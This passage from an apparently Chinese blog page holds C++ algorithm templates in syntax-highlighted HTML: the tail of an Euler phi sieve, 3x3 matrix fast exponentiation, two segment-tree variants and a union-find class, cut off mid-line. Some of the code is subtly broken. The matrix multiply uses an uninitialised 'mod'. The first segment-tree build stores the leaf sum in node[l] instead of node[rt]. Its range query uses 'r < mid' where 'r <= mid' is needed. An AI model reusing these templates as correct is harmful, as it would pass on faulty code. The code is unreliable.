operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span>tp<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                phi<span class="token punctuation">[</span>i<span class="token operator">*</span>tp<span class="token punctuation">]</span><span class="token operator">=</span>phi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>tp<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> phi<span class="token punctuation">[</span>i<span class="token operator">*</span>tp<span class="token punctuation">]</span><span class="token operator">=</span>phi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>phi<span class="token punctuation">[</span>tp<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="4-矩阵快速幂"><a href="#4-矩阵快速幂" class="headerlink" title="4. 矩阵快速幂"></a>4. 矩阵快速幂</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//首先定义一下矩阵类型</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">matrixnod</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> m<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> matrix<span class="token punctuation">;</span><span class="token comment">//3*3的矩阵乘法</span>matrix <span class="token function">mat</span><span class="token punctuation">(</span>matrix a<span class="token punctuation">,</span>matrix b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    matrix c<span class="token punctuation">;</span>    <span class="token keyword">int</span> mod<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token punctuation">.</span>m<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>mod<span class="token punctuation">;</span>        c<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">%=</span>mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//矩阵快速幂 b^n</span>matrix <span class="token function">doexpmat</span><span class="token punctuation">(</span>matrix b<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    matrix a<span class="token operator">=</span> <span class="token comment">//单位矩阵</span>    <span class="token punctuation">&#123;</span>        <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span> a<span class="token operator">=</span><span class="token function">mat</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        n<span class="token operator">=</span>n<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">;</span>        b<span class="token operator">=</span><span class="token function">mat</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="5-线段树"><a href="#5-线段树" class="headerlink" title="5. 线段树"></a>5. 线段树</h3><h4 id="5-1-单点更新，区间查询"><a href="#5-1-单点更新，区间查询" class="headerlink" title="5.1 单点更新，区间查询"></a>5.1 单点更新，区间查询</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Tree</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> l<span class="token punctuation">,</span> r<span class="token punctuation">;</span>    <span class="token keyword">int</span> sum<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">getmid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> node<span class="token punctuation">[</span>maxn <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">=</span> l<span class="token punctuation">,</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">=</span> a<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">=</span> node<span class="token punctuation">[</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">+</span> node<span class="token punctuation">[</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">==</span> pos <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">==</span> pos<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">+=</span> v<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getmid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">></span> mid<span class="token punctuation">)</span>        <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> pos<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">update</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> pos<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">=</span> node<span class="token punctuation">[</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">+</span> node<span class="token punctuation">[</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">GetSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">==</span> l <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">==</span> r<span class="token punctuation">)</span>        <span class="token keyword">return</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getmid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">></span> mid<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">GetSum</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> mid<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">GetSum</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token function">GetSum</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GetSum</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="5-2-区间更新，区间查询"><a href="#5-2-区间更新，区间查询" class="headerlink" title="5.2 区间更新，区间查询"></a>5.2 区间更新，区间查询</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Tree</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> l<span class="token punctuation">,</span> r<span class="token punctuation">;</span>    <span class="token keyword">int</span> dat<span class="token punctuation">,</span> lazy<span class="token punctuation">;</span>    <span class="token function">Tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> lazy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> node<span class="token punctuation">[</span>maxn <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">=</span> l<span class="token punctuation">;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">-</span> l<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">=</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">spread</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">*</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">*</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy<span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy<span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">&amp;&amp;</span> r <span class="token operator">>=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">+=</span> val<span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+=</span> val <span class="token operator">*</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">spread</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span>        <span class="token function">update</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> m<span class="token punctuation">)</span>        <span class="token function">update</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">=</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">spread</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span>        ans <span class="token operator">+=</span> <span class="token function">query</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> mid<span class="token punctuation">)</span>        ans <span class="token operator">+=</span> <span class="token function">query</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ans<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="6-并查集"><a href="#6-并查集" class="headerlink" title="6. 并查集"></a>6. 并查集</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">djset</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> parent<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rank<span class="token punctuation">;</span>    <span class="token function">djset</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">parent</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">rank</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            parent<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>            parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">==</span>b<span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rank<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">&lt;</span>rank<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span>            parent<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> parent<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            parent<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span 